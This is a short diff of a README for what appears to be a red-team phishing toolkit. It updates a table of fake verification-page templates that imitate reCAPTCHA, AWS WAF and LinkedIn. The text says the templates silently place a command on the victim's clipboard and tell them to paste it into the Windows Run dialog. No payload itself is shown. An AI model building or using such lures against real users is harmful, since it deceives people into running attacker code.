@@ -40,7 +40,7 @@ Evilginx Pro-class features clean-room for internal / air-gapped environments.
 | `windows-fix` | Real-campaign replica: reCAPTCHA widget → instruction panel, unified "I am not a robot" clipboard tail | before / after |
 | `recaptcha` | Minimal reCAPTCHA widget on a clean page (title `reCAPTCHA`, official logo) | before / after |
 | `aws-captcha` | AWS WAF Captcha style (navy header, checkbox → instruction gate, pill Verify) | before / after |
-| `linkedin` | ⚠️ unverified — LinkedIn verification card (official logo, `#0a66c2` pill Verify) | before / after |
+| `linkedin` | ✅ verified — LinkedIn verification page: guest header (Join now / Sign in), shield card, reCAPTCHA-style widget, icon-square steps, `#0a66c2` pill Verify | before / after |
 
 Each template silently copies a command payload to the victim's clipboard and
 instructs them to run it (Win+R → Ctrl+V → Enter). The wrapped command always
